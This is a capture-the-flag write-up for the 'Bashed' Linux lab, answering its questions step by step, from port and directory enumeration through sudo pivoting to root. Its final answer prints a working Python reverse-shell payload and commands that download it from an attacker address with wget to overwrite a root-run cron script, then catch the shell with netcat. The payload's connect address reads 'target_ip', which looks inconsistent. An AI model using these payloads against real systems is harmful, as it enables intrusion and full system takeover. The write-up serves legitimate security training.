## Bashed 

### Lab Details 

- Difficulty: Easy 
- Type: Linux

#### Tasks

Q1: How many open TCP ports are listening on Bashed?
 - `nmap target_ip -sT -A -T4`

Q2: What is the relative path on the webserver to a folder that contains phpbash.php?
 - use ffuf to enum the path 
 - `ffuf -u http://target_ip/FUZZ -w /usr/share/wordlists/dirb/big.txt`
 ```
 ...
 [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 317ms]
    * FUZZ: dev
 ... 
 ```
 - webshell located at:  http://target_ip/dev/phpbash.php

Q3: What user is the webserver running as on Bashed?
 - `www-data@bashed`

Q4: Submit the flag located in the arrexel user's home directory.
 - cat /home/arrexel/user.txt

Q5: www-data can run any command as a user without a password. What is that user's username?
 - sudo -l -> scriptmanager

Q6: What folder in the system root can scriptmanager access that www-data could not?
 - ls -la / 
 ```
 drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 scripts
 ```
Q7: What is filename of the file that is being run by root every couple minutes?
 - `-u` flag of sudo allows the a command to be run as another user on the target 
 - `sudo -u scriptmanager ls -la /scripts` can be run to list the content in /scripts directory
 - below is the result of running the ls command at different times
 ```
 -- first run
 www-data@bashed:/# sudo -u scriptmanager ls -la /scripts
 total 16
 drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 .
 drwxr-xr-x 23 root root 4096 Jun 2 2022 ..
 -rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py
 -rw-r--r-- 1 root root 12 May 15 05:45 test.txt

 -- second run 
 www-data@bashed:/# sudo -u scriptmanager ls -la /scripts
 total 16
 drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 .
 drwxr-xr-x 23 root root 4096 Jun 2 2022 ..
 -rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py
 -rw-r--r-- 1 root root 12 May 15 05:48 test.txt
 ``` 
 - theres a difference in modify date of test.txt

Q8: Submit the flag located in root's home directory.
- since test.py is getting executed as cronjob and scriptmanager has read/write access over /scripts
- a reverse shell can be load and will be executed when the next cronjob runs  
- below is test.py 
 ```
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("target_ip",9002))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 import pty
 pty.spawn("sh")
 ```
- host test.py file on local using `python3 -m http.server` 
- fetch from local `sudo -u scriptmanager wget http://10.10.14.27:8000/ -O /scripts/test.py` 
- run netcat to catch the reverse shell with root access 

#### Lesson Learned
